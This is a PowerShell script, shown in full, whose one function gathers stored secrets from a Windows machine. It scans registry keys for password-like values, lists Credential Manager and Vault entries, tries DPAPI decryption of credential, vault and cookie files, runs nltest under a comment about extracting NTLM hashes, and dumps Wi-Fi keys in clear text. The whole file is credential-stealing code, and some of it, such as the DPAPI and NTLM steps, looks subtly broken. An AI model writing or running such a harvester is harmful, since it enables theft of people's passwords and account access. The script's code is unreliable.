
# Import required modules
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Import-Module -Name "Microsoft.PowerShell.Security"

# Function to process and retrieve passwords with enhanced error handling
function Get-StoredCredentials {
    $credentials = @()

    $registryPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
        "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "HKCU:\Software\Microsoft\Credentials",
        "HKCU:\Software\Microsoft\Protected Storage System Provider",
        "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms",
        "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\SPW",
        "HKCU:\Software\Google\Chrome\PreferenceMACs",
        "HKCU:\Software\Google\Chrome\Default\Web Data",
        "HKCU:\Software\Mozilla\Firefox\Profiles",
        "HKCU:\Software\Microsoft\Office\16.0\Common\Identity\Identities",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Credssp\PolicyDefaults",
        "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations",
        "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
    )

    foreach ($path in $registryPaths) {
        try {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -ErrorAction Stop |
                    Get-ItemProperty -ErrorAction SilentlyContinue |
                    Where-Object { $_.PSObject.Properties.Name -match "password|credential|auth" } |
                    ForEach-Object {
                        $_.PSObject.Properties | Where-Object { $_.Name -match "password|credential|auth" } | ForEach-Object {
                            $credentials += [PSCustomObject]@{
                                Source = "Registry"
                                Path = $path
                                Name = $_.Name
                                Value = $_.Value
                            }
                        }
                    }
            } else {
                $credentials += [PSCustomObject]@{
                    Source = "Registry"
                    Path = $path
                    Name = "Error"
                    Value = "Path does not exist."
                }
            }
        }
        catch {
            $credentials += [PSCustomObject]@{
                Source = "Registry"
                Path = $path
                Name = "Error"
                Value = $_.Exception.Message
            }
        }
    }

    # Use cmdkey to list stored credentials
    $cmdkeyOutput = cmdkey /list | Where-Object { $_ -match 'Target:|User:|Type:' }
    for ($i = 0; $i -lt $cmdkeyOutput.Count; $i += 3) {
        $target = ($cmdkeyOutput[$i] -replace 'Target: ', '').Trim()
        $type = if ($i + 1 -lt $cmdkeyOutput.Count) { ($cmdkeyOutput[$i + 1] -replace 'Type: ', '').Trim() } else { "N/A" }
        $user = if ($i + 2 -lt $cmdkeyOutput.Count) { ($cmdkeyOutput[$i + 2] -replace 'User: ', '').Trim() } else { "N/A" }
        $credentials += [PSCustomObject]@{
            Source = "Windows Credential Manager"
            Path = $target
            Name = "Type"
            Value = $type
        }
        $credentials += [PSCustomObject]@{
            Source = "Windows Credential Manager"
            Path = $target
            Name = "User"
            Value = $user
        }
    }

    # Use vaultcmd to list Windows Vault credentials
    $vaultOutput = vaultcmd /listcreds:"Windows Credentials" /all
    $vaultOutput += vaultcmd /listcreds:"Web Credentials" /all
    $currentResource = $null
    foreach ($line in $vaultOutput) {
        if ($line -match "^Resource:") {
            $currentResource = $line -replace "Resource: ", ""
        }
        elseif ($line -match "^Identity:") {
            $identity = $line -replace "Identity: ", ""
            $credentials += [PSCustomObject]@{
                Source = "Windows Vault"
                Path = $currentResource
                Name = "Identity"
                Value = $identity
            }
        }
    }

    # DPAPI Decryption
    $dpapiPaths = @(
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect",
        "$env:USERPROFILE\AppData\Local\Microsoft\Credentials",
        "$env:USERPROFILE\AppData\Local\Microsoft\Vault",
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Cookies"
    )
    foreach ($dpapiPath in $dpapiPaths) {
        try {
            Get-ChildItem -Path $dpapiPath -Recurse -ErrorAction Stop |
                ForEach-Object {
                    if ($_.Content) {
                        $credentials += [PSCustomObject]@{
                            Source = "DPAPI"
                            Path = $_.FullName
                            Name = $_.Name
                            Value = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($_.Content, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
                        }
                    } else {
                        throw [System.Exception] "No content found."
                    }
                }
        }
        catch {
            $credentials += [PSCustomObject]@{
                Source = "DPAPI"
                Path = $dpapiPath
                Name = "Error"
                Value = $_.Exception.Message
            }
        }
    }

    # Extract NTLM Hashes
    try {
        $lsaSecrets = Invoke-Command { nltest /SC_QUERY:$env:USERDOMAIN }
        foreach ($secret in $lsaSecrets) {
            if ($secret -match "Secret:") {
                $credentials += [PSCustomObject]@{
                    Source = "LSA Secrets"
                    Path = "NLTest"
                    Name = "Secret"
                    Value = $secret
                }
            }
        }
    }
    catch {
        $credentials += [PSCustomObject]@{
            Source = "LSA Secrets"
            Path = "NLTest"
            Name = "Error"
            Value = $_.Exception.Message
        }
    }

    # Retrieve WiFi passwords
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '.*: ', '' }
    foreach ($profile in $wifiProfiles) {
        try {
            $wifiPassword = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_ -replace '.*: ', '' }
            $credentials += [PSCustomObject]@{
                Source = "WiFi"
                Path = $profile
                Name = "Password"
                Value = $wifiPassword
            }
        }
        catch {
            $credentials += [PSCustomObject]@{
                Source = "WiFi"
                Path = $profile
                Name = "Error"
                Value = $_.Exception.Message
            }
        }
    }

    return $credentials | Sort-Object Source, Path
}